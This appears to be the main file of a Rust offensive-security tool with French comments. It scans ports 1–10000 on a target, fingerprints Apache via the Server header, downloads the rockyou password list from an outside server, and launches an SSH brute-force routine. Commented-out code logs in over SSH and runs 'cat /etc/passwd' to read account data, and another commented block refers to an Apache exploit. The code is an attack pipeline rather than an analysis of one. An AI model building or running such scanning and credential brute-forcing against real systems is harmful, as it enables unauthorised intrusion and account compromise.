mod ssh;
mod web;
mod utils;

use std::error::Error;

use std::net::{TcpStream};
use std::process::{Command};

use reqwest;

use tokio::io::{AsyncBufReadExt};

use std::fs::{read_to_string};


fn ping_ip(ip_address: &str) -> Result<(), String> {
    let command = Command::new("ping")
        .arg("-c")
        .arg("4") // Nombre de paquets à envoyer
        .arg(ip_address)
        .output()
        .map_err(|e| format!("Failed to execute ping command: {}", e))?;

    if command.status.success() {
        println!("Ping successful to {}", ip_address);
        Ok(())
    } else {
        let error_message = String::from_utf8_lossy(&command.stderr);
        Err(format!("Failed to ping {}: {}", ip_address, error_message))
    }
}


fn scan_ports(target_ip: &str) -> Vec<u16> {
    println!("Scanning ports ");
    let mut open_ports = Vec::new();

    for port in 1..=10000 {
        let address = format!("{}:{}", target_ip, port);
        match TcpStream::connect(address) {
            Ok(_) => {
                println!("Port {} is open", port);
                open_ports.push(port);
            },
            Err(_) => {} // Ignore errors, assuming port is closed
        }
    }

    open_ports
}


pub async fn get_apache_headers(target: String) -> Result<(), reqwest::Error> {
    let url = format!("http://{}", target);
    let client = reqwest::Client::new();
    let res = client.get(&url).send().await?;

    if let Some(server) = res.headers().get("Server") {
        println!("Server: {:?}", server);
    } else {
        println!("Server header not found");
    }

    Ok(())
}





//#[tokio::main]
//async fn main() { //main function for apache exploit
//    let ip_address = "192.168.1.122";
//    let url = format!("http://{}",ip_address);
//
//    match ping_ip(ip_address) {
//        Ok(_) => scan_ports(ip_address),
//        Err(_) => {}
//    }
//
//    //exploit_apache(ip_address).await.expect("TODO: panic message");
//
//    get_apache_headers(ip_address.to_string()).await;
//}



fn get_line(file_path: String) -> Vec<String>{

    read_to_string(file_path)
        .unwrap()  // panic on possible file-reading errors
        .lines()  // split the string into an iterator of string slices
        .map(String::from)  // make each slice into a string
        .collect()  // gather them together into a vector
}




use std::io::prelude::*;


#[tokio::main]
async fn main() {
    let ip_address = "192.168.1.122";
    let ip_srv = "51.77.193.65";
    let port = "8000";


    let port_ouvert = scan_ports(ip_address); // donne un tableau de port ouvert

    println!("Open ports: {:?}", port_ouvert);

    utils::get_rockyou(ip_srv, port).await.expect("error : dl rockyou");

    ssh::ssh_bruteforce(ip_address, "bibli/").await; //file pathe c'est le chemin pas le fichier





            //si port == 22 :

    /*  let file_path = "";

      let mut file: String;


/ssh session
      let tcp = TcpStream::connect(format!("{}:22", ip_address)).unwrap(); //faudra changer l'ip
      let mut sess = Session::new().unwrap();

      sess.set_tcp_stream(tcp);
      sess.handshake().unwrap();
      let timeout_secs = Duration::from_secs(1);
      let timeout_ms = timeout_secs.as_millis() as u32;
      sess.set_timeout(timeout_ms);

      //16 fichiers rockyou


  let mut channel = sess.channel_session().unwrap();
  channel.exec("cat /etc/passwd").unwrap();
  let mut s = String::new();
  channel.read_to_string(&mut s).unwrap();
  println!("{}", s);
  channel.close().expect("TODO: panic message");
  sess.disconnect(None, "ByeBye", None).unwrap();


  cmp = cmp + 1;
  */

}
